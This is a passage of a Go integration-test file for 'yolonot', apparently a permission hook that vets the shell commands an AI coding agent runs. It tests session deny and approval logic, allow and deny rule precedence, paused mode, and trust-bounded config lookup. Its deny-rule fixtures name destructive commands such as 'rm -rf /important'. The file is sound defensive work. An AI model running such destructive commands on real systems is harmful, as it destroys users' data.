	}

	// User rejects: no PostToolUse fires. Next Pre call should recognize
	// asked-but-not-approved and emit deny (session_deny layer), not re-ask.
	out2 := runHookWithStruct(t, makePrePayload(sid, cmd, "/tmp"))
	resp2 := parseResponse(t, out2)
	if resp2.HookSpecificOutput.PermissionDecision != "deny" {
		t.Fatalf("second call: expected deny via session_deny, got %q (reason=%q)",
			resp2.HookSpecificOutput.PermissionDecision,
			resp2.HookSpecificOutput.PermissionDecisionReason)
	}
	if !strings.Contains(resp2.HookSpecificOutput.PermissionDecisionReason, "session_deny") {
		t.Errorf("second call: banner should credit session_deny layer, got %q",
			resp2.HookSpecificOutput.PermissionDecisionReason)
	}
}

// Symmetry fix: a newly-added allow-cmd must clear a prior session_deny,
// the same way a newly-added deny-cmd clears a prior session_approved.
// Without this, once the user rejects a command they can never unblock it
// without wiping the session file — even if they explicitly add an allow rule.
func TestIntegration_AllowRule_ClearsSessionDeny(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})

	sid := "int-allow-clears-deny"
	cmd := "curl example.com"
	projSID := ProjectSessionID(sid, "/tmp")

	// Seed the session to look like "the user was asked once and rejected".
	AppendLine(projSID, "asked", cmd)
	AppendLine(projSID, "denied", cmd)

	// Without an allow rule, a replay should be denied (session_deny).
	out := runHookWithStruct(t, makePrePayload(sid, cmd, "/tmp"))
	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Fatalf("sanity: expected session_deny, got %q", resp.HookSpecificOutput.PermissionDecision)
	}

	// User adds an explicit allow rule → that must now override the
	// stale session_deny.
	writeGlobalRules(t, home, "allow-cmd *curl *\n")

	out2 := runHookWithStruct(t, makePrePayload(sid, cmd, "/tmp"))
	resp2 := parseResponse(t, out2)
	if resp2.HookSpecificOutput.PermissionDecision != "allow" {
		t.Fatalf("expected allow-rule to override session_deny, got %q (reason=%q)",
			resp2.HookSpecificOutput.PermissionDecision,
			resp2.HookSpecificOutput.PermissionDecisionReason)
	}
	if !strings.Contains(resp2.SystemMessage, "rule") {
		t.Errorf("banner should credit rule layer, got %q", resp2.SystemMessage)
	}
}

// When paused, PostToolUse must NOT silently write to the session's approved
// list. Otherwise unpausing reveals a pile of pre-approvals for commands
// yolonot never actually vetted.
func TestIntegration_Paused_PostToolUseDoesNotRecordApproval(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})

	sid := "int-paused-post-noop"
	cmd := "curl example.com"

	// Mark the session paused.
	sessionsDir := filepath.Join(YolonotDir(), "sessions")
	os.MkdirAll(sessionsDir, 0755)
	pausedFile := filepath.Join(sessionsDir, sid+".paused")
	if err := os.WriteFile(pausedFile, []byte(""), 0644); err != nil {
		t.Fatal(err)
	}

	// PostToolUse during pause — must be a no-op.
	post := makePostPayloadStruct(sid, cmd)
	post.Cwd = "/tmp"
	runHookWithStruct(t, post)

	// Unpause.
	os.Remove(pausedFile)

	// The approved list must be empty — the paused PostToolUse didn't leak in.
	projSID := ProjectSessionID(sid, "/tmp")
	if ContainsLine(projSID, "approved", cmd) {
		t.Errorf("command %q should NOT be on approved list after paused PostToolUse", cmd)
	}
}

// Same guarantee for YOLONOT_DISABLED=1: disabled mode is a total bypass,
// PostToolUse included. Otherwise disabling yolonot still quietly mutates
// session state.
func TestIntegration_Disabled_PostToolUseDoesNotRecordApproval(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})

	sid := "int-disabled-post-noop"
	cmd := "curl example.com"

	t.Setenv("YOLONOT_DISABLED", "1")

	post := makePostPayloadStruct(sid, cmd)
	post.Cwd = "/tmp"
	runHookWithStruct(t, post)

	projSID := ProjectSessionID(sid, "/tmp")
	if ContainsLine(projSID, "approved", cmd) {
		t.Errorf("command %q should NOT be on approved list when YOLONOT_DISABLED=1", cmd)
	}
}

// Deny rules are the hard gate — a prior session approval must NOT bypass a
// later deny-cmd. (Contrast with ask: ask defers to prior approval.)
func TestIntegration_DenyRule_BeatsSessionApproved(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})

	sid := "int-deny-beats-session"
	cmd := "curl example.com"

	// Seed the session as if the command was previously approved (e.g. before
	// the deny rule was added).
	projSID := ProjectSessionID(sid, "/tmp")
	AppendLine(projSID, "approved", cmd)

	// Now add a deny rule.
	writeGlobalRules(t, home, "deny-cmd *curl *\n")

	out := runHookWithStruct(t, makePrePayload(sid, cmd, "/tmp"))
	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Fatalf("expected deny (rule beats session), got %q", resp.HookSpecificOutput.PermissionDecision)
	}
}

// TestIntegration_LocalAllowConfigMigrates verifies the one-shot migration
// from legacy `local_allow: true` to an explicit `fast-allow` entry at the
// head of the pre-check list. Users who set `yolonot local-allow on` before
// this refactor must keep getting the fast path after upgrading.
func TestIntegration_LocalAllowConfigMigrates(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	// Write the legacy config shape directly (not via SaveConfig, to keep
	// the field on disk until LoadConfig migrates it).
	legacy := []byte(`{"local_allow": true}`)
	os.MkdirAll(YolonotDir(), 0755)
	if err := os.WriteFile(configPath(), legacy, 0600); err != nil {
		t.Fatal(err)
	}

	cfg := LoadConfig()
	if cfg.LocalAllow {
		t.Error("LocalAllow should be cleared after migration")
	}
	if len(cfg.PreCheck) == 0 || cfg.PreCheck[0] != FastAllowSentinel {
		t.Errorf("fast-allow should be prepended to PreCheck, got %v", cfg.PreCheck)
	}

	// And it should have been persisted — a second load should not re-migrate.
	cfg2 := LoadConfig()
	if len(cfg2.PreCheck) != 1 {
		t.Errorf("migration should run exactly once, got %v", cfg2.PreCheck)
	}
}

// chdirInRepo creates a git repo rooted at `repoRoot` (makes a `.git` dir),
// then chdirs to `sub` beneath it. Returns a cleanup that restores cwd.
// Needed because walk-up is trust-bounded to the git-repo root.
func chdirInRepo(t *testing.T, repoRoot, sub string) func() {
	t.Helper()
	orig, _ := os.Getwd()
	if err := os.MkdirAll(filepath.Join(repoRoot, ".git"), 0755); err != nil {
		t.Fatal(err)
	}
	if sub == "" {
		sub = repoRoot
	} else {
		os.MkdirAll(sub, 0755)
	}
	if err := os.Chdir(sub); err != nil {
		t.Fatal(err)
	}
	return func() { os.Chdir(orig) }
}

func TestIntegration_AllowRedirect_WiredIntoHook(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()
	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})

	repo := filepath.Join(home, "proj")
	restore := chdirInRepo(t, repo, repo)
	defer restore()

	os.WriteFile(filepath.Join(repo, ".yolonot"),
		[]byte("allow-redirect /tmp/build/*\n"), 0644)
	os.MkdirAll("/tmp/build", 0755)

	payload := makePrePayload("int-allow-redir", "ls > /tmp/build/log", repo)
	out := runHookWithStruct(t, payload)
	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow (allow-redirect wired), got %q reason=%q",
			resp.HookSpecificOutput.PermissionDecision,
			resp.HookSpecificOutput.PermissionDecisionReason)
	}
	if !strings.Contains(resp.SystemMessage, "fast_allow") {
		t.Errorf("expected fast_allow banner, got %q", resp.SystemMessage)
	}
}

func TestIntegration_RuleMessageAppearsInDecisionReason(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()
	writeGlobalRules(t, home, `deny-cmd *rm -rf /* "custom warning about rm"`+"\n")

	payload := makePrePayload("int-msg", "rm -rf /important", "/tmp")
	out := runHookWithStruct(t, payload)
	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Fatalf("expected deny, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "custom warning about rm") {
		t.Errorf("per-rule message not surfaced in reason: %q",
			resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

func TestWalkUpConfigOrdering(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	repo := filepath.Join(home, "proj")
	child := filepath.Join(repo, "sub", "deep")
	restore := chdirInRepo(t, repo, child)
	defer restore()

	// Closer wins first-match. Both files define the same pattern but with
	// different actions — whichever is returned first is the active rule.
	os.WriteFile(filepath.Join(repo, ".yolonot"),
		[]byte("deny-cmd testcmd*\n"), 0644)
	os.MkdirAll(filepath.Join(repo, "sub"), 0755)
	os.WriteFile(filepath.Join(repo, "sub", ".yolonot"),
		[]byte("allow-cmd testcmd*\n"), 0644)

	rules := LoadRules()
	m := MatchRuleWith("testcmd foo", rules, nil)
	if m == nil {
		t.Fatal("expected a match, got none")
	}
	if m.Action != "allow" {
		t.Errorf("expected closer (sub/) to win with allow, got %s", m.Action)
	}
}

func TestWalkUpStopsAtHome(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Legacy file form of ~/.yolonot (not the sessions/cache directory).
	// withFakeHome creates it as a dir — remove and replace with a file so
	// the dedup path can fire.
	os.RemoveAll(filepath.Join(home, ".yolonot"))
	os.WriteFile(filepath.Join(home, ".yolonot"),
		[]byte("deny-cmd dupcheck*\n"), 0644)

	// Git repo AT $HOME so walk-up reaches ~/.yolonot via the walk, and the
	// legacy-file branch at the end would also try to add it — dedup must fire.
	restore := chdirInRepo(t, home, home)
	defer restore()

	paths := yolonotConfigSearchPaths()
	count := 0
	target := filepath.Join(home, ".yolonot")
	for _, p := range paths {
		if p == target {
			count++
		}
	}
	if count != 1 {
		t.Errorf("~/.yolonot should appear exactly once in search paths, got %d: %v", count, paths)
	}
}

func TestWalkUpScopedToGitRepo(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Outside-repo `.yolonot` must NOT be loaded — trust-root boundary.
	outside := filepath.Join(home, "untrusted")
	os.MkdirAll(outside, 0755)
	os.WriteFile(filepath.Join(outside, ".yolonot"),
		[]byte("allow-cmd evilcmd*\n"), 0644)

	// Repo under the untrusted ancestor. Walk-up must stop at repo root.
	repo := filepath.Join(outside, "proj")
	restore := chdirInRepo(t, repo, repo)
	defer restore()

	rules := LoadRules()
	for _, r := range rules {
		if r.Pattern == "evilcmd*" {
			t.Error("rule from outside-repo .yolonot leaked through walk-up — trust boundary breached")
		}
	}
}

func TestCmdPreCheckAddFastAllow(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	// default: no pre-check entries
	cfg := LoadConfig()
	for _, p := range cfg.PreCheck {
		if p == FastAllowSentinel {
			t.Fatal("expected fast-allow NOT to be set by default")
		}
	}

	captureStdout(func() { cmdPreCheck([]string{"add", FastAllowSentinel}) })
	cfg = LoadConfig()
	found := false
	for _, p := range cfg.PreCheck {
		if p == FastAllowSentinel {
			found = true
		}
	}
	if !found {
		t.Errorf("fast-allow should be in PreCheck after add, got %v", cfg.PreCheck)
	}

	// Adding again should be a no-op (dedup), not a duplicate.
	captureStdout(func() { cmdPreCheck([]string{"add", FastAllowSentinel}) })
	cfg = LoadConfig()
	count := 0
	for _, p := range cfg.PreCheck {
		if p == FastAllowSentinel {
			count++
		}
	}
	if count != 1 {
		t.Errorf("fast-allow should appear exactly once, got %d (%v)", count, cfg.PreCheck)
	}

	captureStdout(func() { cmdPreCheck([]string{"remove", FastAllowSentinel}) })
	cfg = LoadConfig()
	for _, p := range cfg.PreCheck {
		if p == FastAllowSentinel {
			t.Error("fast-allow should be gone after remove")
		}
	}
}
